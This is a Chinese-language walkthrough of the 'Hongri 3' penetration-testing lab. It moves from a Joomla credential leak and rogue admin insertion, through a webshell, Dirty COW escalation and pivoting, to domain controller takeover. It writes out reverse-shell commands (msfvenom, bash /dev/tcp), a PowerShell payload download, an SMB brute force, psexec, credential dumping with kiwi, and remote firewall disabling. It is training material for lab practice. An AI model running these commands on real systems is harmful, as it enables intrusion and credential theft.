---
title: 红日3
date: 2023-09-03T15:29:52+08:00
updated: 2023-08-24T02:30:46+08:00
categories: 
- 渗透测试
- 靶机练习
---

## 环境搭建

```
pc:192.168.93.30
win2008: 192.168.93.20
windows server2012:192.168.93.10
web-centos: 外：192.168.111.129 内:192.168.93.100
web1-ubuntu: ????
```

## 外网打点

首先对web服务器进行端口探测

![1](E:\笔记软件\笔记\渗透测试\靶机练习\红日3\1.png)

开放了基础的80端口，ssh,以及mysql服务，看到该网站是通过joomla搭建，直接上对应框架的工具![2](E:\笔记软件\笔记\渗透测试\靶机练习\红日3\2.png)

能够看到框架的版本信息，目录，以及组件等，扫到一个重要信息泄露

![3](E:\笔记软件\笔记\渗透测试\靶机练习\红日3\3.png)

找到了明文密码

```
$user = 'testuser'; public $password = 'cvcvgjASD!@'; 
```

该密码经过加密，无法登录，尝试远程登录数据库

利用该密码成功连接上数据库

![4](E:\笔记软件\笔记\渗透测试\靶机练习\红日3\4.png)

查看一下数据库的信息

![5](E:\笔记软件\笔记\渗透测试\靶机练习\红日3\5.png)

搜集到admin的账户和加密的密码

```
admin
$10$N/Yv/9rzxyq.z0gLTT5og.pj3FFAP8Sq2PcBgsMX/Qnc2671qQkHy
以及
administrator
$10$t1RelJijihpPhL8LARC9JuM/AWrVR.nto/XycrybdRbk8IEg6Dze2
```

测试后发现能够直接intooutfile写shell,但是并没有可写的路径，试着朝tmp目录下写同样被拒绝

换条思路，生成一个新的用户

https://docs.joomla.org/How_do_you_recover_or_reset_your_admin_password%3F/zh-cn通过官方的密码重置路线，我们利用sql语句写一个新用户

```sql
INSERT INTO `am2zu_users`
   (`name`, `username`, `password`, `params`, `registerDate`, `lastvisitDate`, `lastResetTime`)
VALUES ('Administrator2', 'admin2',
    'd2064d358136996bd22421584a7cb33e:trd7TvKHx6dMeoMmBVxYmg0vuXEA4199', '', NOW(), NOW(), NOW());
INSERT INTO `am2zu_user_usergroup_map` (`user_id`,`group_id`)
VALUES (LAST_INSERT_ID(),'8');
```

并且根据官方描述，这个用户具有管理权限

![7](E:\笔记软件\笔记\渗透测试\靶机练习\红日3\7.png)

如此便成功登录后台

![8](E:\笔记软件\笔记\渗透测试\靶机练习\红日3\8.png)

选一个目录写入shell,直接蚁剑连接

![9](E:\笔记软件\笔记\渗透测试\靶机练习\红日3\9.png)

执行命令发现返回数据不正常，有disable_function存在，尝试绕过disable_function,利用蚁剑的插件代理，很容易就能绕过

![10](E:\笔记软件\笔记\渗透测试\靶机练习\红日3\10.png)

尝试上线msf,生成回连文件

```
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.111.128 LPORT=4444 -f elf > shell.elf
```

msf启动对应的模块端口进行监听，连接都被拒绝，无法上线，之后在目标机器的文件中找到了ssh连接的用户

/tmp/mysql下的test.txt中存在

```
adduser wwwuser
passwd wwwuser_123Aqx
```

利用ssh服务登录到目标机器

![11](E:\笔记软件\笔记\渗透测试\靶机练习\红日3\11.png)

查看了机器的内核信息，发现处于脏牛提权的范围内，采用脏牛进行提权，上传脚本，编译并执行

![12](E:\笔记软件\笔记\渗透测试\靶机练习\红日3\12.png)

成功提权，提权后即可将shell传回msf,分别执行

```
msf6 > handler -H 192.168.111.128 -P 4444 -p  linux/x64/shell/reverse_tcp -n msf_linux_bash
[*] Payload handler running as background job 0.

[*] Started reverse TCP handler on 192.168.111.128:4444 
```

```
bash -i >& /dev/tcp/192.168.111.128/4444 0>&1
```

即可传回shell

![13](E:\笔记软件\笔记\渗透测试\靶机练习\红日3\13.png)

但这样获取到的shell并不是msf的session，需要再进行转换到msf的session

```
use post/multi/manage/shell_to_meterpreter
set lhost   192.168.111.128
set lport   4445
set session 3
run
```

session根据msf的不同需要自行设置

![14](E:\笔记软件\笔记\渗透测试\靶机练习\红日3\14.png)

## 内网渗透

拿到msf-shell之后，我们便可以利用该机器作为跳板机进行内网渗透，添加路由

```
route add 192.168.93.0 255.255.255.0 4
```

![15](E:\笔记软件\笔记\渗透测试\靶机练习\红日3\15.png)

建立sock4a通道

```
use auxiliary/server/socks_proxy
set version 4a
run
```

修改proxychains配置文件，方便后续使用namp,探测存活主机

```
use auxiliary/scanner/discovery/udp_probe
set rhosts 192.168.93.1-255
run
```


![16](E:\笔记软件\笔记\渗透测试\靶机练习\红日3\16.png)

扫出来三台主机

```
192.168.93.10 ==可知为windows
...........20  ==>win2008
		  30  ==> win7
```

根据搭建环境还有一台没扫出来，由于都是windows主机，利用ms的smb_version模块去扫描445端口

```
use auxiliary/scanner/smb/smb_version
```

扫描发现三台主机都开放了445端口，可以利用永恒之蓝尝试在这些主机上执行命令，试了三个模块，都无法直接上线，也无法执行命令，利用代理重新扫描端口信息，

192.168.93.10

![17](E:\笔记软件\笔记\渗透测试\靶机练习\红日3\17.png)

192.168.93.20

![18](E:\笔记软件\笔记\渗透测试\靶机练习\红日3\18.png)

30

![19](E:\笔记软件\笔记\渗透测试\靶机练习\红日3\19.png)

能够知道的是都开启了445端口，并且10主机开放了88端口

### SMB爆破

使用msf中的smb模块

```
use auxiliary/scanner/smb/smb_login
set rhosts 192.168.93.20
set SMBUser Administrator
set PASS_FILE /tmp/top10000.txt
```

![20](E:\笔记软件\笔记\渗透测试\靶机练习\红日3\20.png)

成功拿到密码123qwe!ASD,这个密码在20,30主机上都能够使用，利用msf的模块去拿20，30主机的shell

```
use exploit/windows/smb/psexec
set payload windows/meterpreter/bind_tcp
set rhosts 192.168.93.20
set smbuser administrator
set smbpass 123qwe!ASD
run
```

![21](E:\笔记软件\笔记\渗透测试\靶机练习\红日3\21.png)

尝试将shell发送回cs,无论是直接反弹，还是上传后门并执行都没法上线cs

```
powershell (new-object Net.WebClient).DownloadFile('http://192.168.93.100:8000/beacon.exe','C:\beacon.exe')
```

打算直接在msf上操作了，在win2008中寻找域控

```
nslookup -type=SRV _ldap._tcp
```

![22](E:\笔记软件\笔记\渗透测试\靶机练习\红日3\22.png)

能够确定域控机器是10机器了，并且win2008存在域控用户的进程，关闭防火墙使用msf中的kiwi进行密码抓取

```
load kiwi
kiwi_cmd privilege::debug
kiwi_cmd sekurlsa::logonPasswords
```

kiwi模块默认加载x32，如果目标系统64位，需要我们把进程迁到64位里面

```
migrate 3624
```

![23](E:\笔记软件\笔记\渗透测试\靶机练习\红日3\23.png)

能够抓取到域管用户的密码

![24](E:\笔记软件\笔记\渗透测试\靶机练习\红日3\24.png)

直接使用msf登录失败

![25](E:\笔记软件\笔记\渗透测试\靶机练习\红日3\25.png)

估计需要去关闭win2012的防火墙，在2008上与域控主机建立ipc连接，关闭防火墙

```shell
net use \\192.168.93.10\ipc$ zxcASDqw123!! /user:test\administrator
sc \\192.168.93.10 create unablefirewall binpath= "netsh advfirewall set allprofiles state off"   
sc \\192.168.93.10 start unablefirewall     
```

关闭防火墙就可以去利用smb/psexec建立连接了

![26](E:\笔记软件\笔记\渗透测试\靶机练习\红日3\26.png)

成功建立连接，进入目标机器找flag,flag位于

```
C:\Users\Administrator\Documents
```

打印flag即可

![28](E:\笔记软件\笔记\渗透测试\靶机练习\红日3\28.png)

至此结束

### 小结：

不了解的地方主要是没有CS如何利用msf的模块对windows机器进行渗透，以及ipc建立连接，445端口可以有什么利用的点不熟悉
